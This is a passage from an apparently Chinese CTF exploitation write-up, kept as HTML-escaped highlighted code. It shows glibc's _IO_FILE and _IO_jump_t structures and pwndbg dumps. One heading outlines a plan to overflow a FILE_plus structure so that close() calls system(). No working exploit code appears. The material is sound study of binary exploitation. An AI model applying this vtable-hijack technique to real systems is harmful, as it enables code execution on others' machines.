class=&#34;type&#34;&gt;char&lt;/span&gt; *_IO_backup_base;  &lt;span class=&#34;comment&#34;&gt;/* Pointer to first valid character of backup area */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *_IO_save_end; &lt;span class=&#34;comment&#34;&gt;/* Pointer to end of non-current get area. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_marker&lt;/span&gt; *_&lt;span class=&#34;title&#34;&gt;markers&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_FILE&lt;/span&gt; *_&lt;span class=&#34;title&#34;&gt;chain&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; _fileno;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; 0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; _blksize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; _flags2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_off_t _old_offset; &lt;span class=&#34;comment&#34;&gt;/* This used to be _offset but it&amp;#x27;s too small.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; __HAVE_COLUMN &lt;span class=&#34;comment&#34;&gt;/* temporary */&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* 1+column number of pbase(); 0 is unknown. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;short&lt;/span&gt; _cur_column;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;signed&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; _vtable_offset;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; _shortbuf[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/*  char* _save_gptr;  char* _save_egptr; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_lock_t *_lock;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;ifdef&lt;/span&gt; _IO_USE_OLD_IO_FILE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_FILE_complete&lt;/span&gt;  //新版本下已经被删除&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_FILE&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;file&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; defined _G_IO_IO_FILE_VERSION &amp;amp;&amp;amp; _G_IO_IO_FILE_VERSION == 0x20001&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_off64_t _offset;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;# &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; defined _LIBC || defined _GLIBCPP_USE_WCHAR_T&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Wide character stream stuff.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_codecvt&lt;/span&gt; *_&lt;span class=&#34;title&#34;&gt;codecvt&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_wide_data&lt;/span&gt; *_&lt;span class=&#34;title&#34;&gt;wide_data&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_FILE&lt;/span&gt; *_&lt;span class=&#34;title&#34;&gt;freeres_list&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *_freeres_buf;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;# &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *__pad1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *__pad2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *__pad3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *__pad4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;# &lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; __pad5;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; _mode;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Make sure we don&amp;#x27;t get into trouble again.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; _unused2[&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt; * &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *) - &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt;)];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *)&lt;span class=&#34;number&#34;&gt;0x804c410&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags = &lt;span class=&#34;number&#34;&gt;-72538984&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_ptr = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_end = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_base = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_base = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_ptr = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_end = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_base = &lt;span class=&#34;number&#34;&gt;0x804c570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;14&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_end = &lt;span class=&#34;number&#34;&gt;0x804d570&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_backup_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _markers = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _chain = &lt;span class=&#34;number&#34;&gt;0xf7fb7cc0&lt;/span&gt; &amp;lt;_IO_2_1_stderr_&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _fileno = &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _old_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _cur_column = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _vtable_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _shortbuf = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _lock = &lt;span class=&#34;number&#34;&gt;0x804c4a8&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _offset = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _codecvt = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _wide_data = &lt;span class=&#34;number&#34;&gt;0x804c4b4&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_list = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_buf = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __pad5 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _mode = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _unused2 = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;39&lt;/span&gt; times&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  vtable = &lt;span class=&#34;number&#34;&gt;0xf7fb6ac0&lt;/span&gt; &amp;lt;_IO_file_jumps&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;h3 id=&#34;回归题目思路明确溢出修改fd的plus调用close时调用system&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#回归题目思路明确溢出修改fd的plus调用close时调用system&#34;&gt;#&lt;/a&gt; 回归题目，思路明确，溢出修改 fd 的 plus，调用 close 时调用 system，&lt;/h3&gt;
&lt;p&gt;下面时 vtable 的一些内容&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_jump_t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt;, __dummy);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt;, __dummy2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_finish_t, __finish);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_overflow_t, __overflow);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_underflow_t, __underflow);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_underflow_t, __uflow);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* showmany */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_xsputn_t, __xsputn);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_seekoff_t, __seekoff);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_seekpos_t, __seekpos);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_setbuf_t, __setbuf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_sync_t, __sync);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_doallocate_t, __doallocate);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_read_t, __read);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_write_t, __write);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_seek_t, __seek);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_close_t, __close);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_stat_t, __stat);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    JUMP_FIELD(_IO_imbue_t, __imbue);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; 0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    get_column;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    set_column;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;程序运行时的情况&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p &amp;amp;_IO_file_jumps&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt; = (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_jump_t *) &lt;span class=&#34;number&#34;&gt;0xf7fb6ac0&lt;/span&gt; &amp;lt;_IO_file_jumps&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_jump_t *)&lt;span class=&#34;number&#34;&gt;0xf7fb6ac0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;27&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __dummy = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __dummy2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, 